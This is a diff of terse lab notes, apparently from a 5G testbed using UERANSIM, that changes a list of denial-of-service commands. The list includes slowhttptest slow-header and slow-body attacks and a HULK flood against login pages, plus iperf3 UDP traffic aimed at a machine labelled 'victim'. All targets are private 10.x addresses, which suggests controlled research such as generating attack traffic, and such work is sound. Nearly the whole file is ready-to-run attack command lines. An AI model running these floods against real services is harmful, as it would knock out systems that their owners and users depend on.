@@ -1,5 +1,16 @@
 - >>
-/ueransim/tools/slowhttptest/bin/slowhttptest -c 1000 -H -g -o slowhttpheader -i 4 -r 200 -t GET -u http://10.50.50.50/login.php -x 24 -p 3
+/ueransim/tools/slowhttptest/bin/slowhttptest -c 1400 -H -g -o slowhttpheader -i 4 -r 200 -t GET -u http://10.50.50.50/login.php -x 24 -p 3
+
+iperf3 -c 10.50.50.51 -u -b 2M -t 1000 --bidir ( from  ue 12)
+iperf3 -c 10.50.50.50 -u -b 4M -t 1000 --bidir (victim machine) (from ue22)
+
+
+
+
+
+
+
+
 
 backup attacks
 ./slowhttptest -c 1000 -B -g -o slowhttpbody -i 4 -r 200 -t POST -u https://10.200.200.13/login.php -x 24 -p 3
@@ -8,8 +19,7 @@ backup attacks
 go run /ueransim/tools/hulk.go -site https://10.200.200.13/login.php
 
 
-iperf3 -c 10.50.50.51 -u -b 1M -t 200 --bidir ( from  ue 12)
-iperf3 -c 10.50.50.50 -u -b 2M -t 1000 --bidir (victim machine) (from ue22)
+
 
 
 back iperf Servers
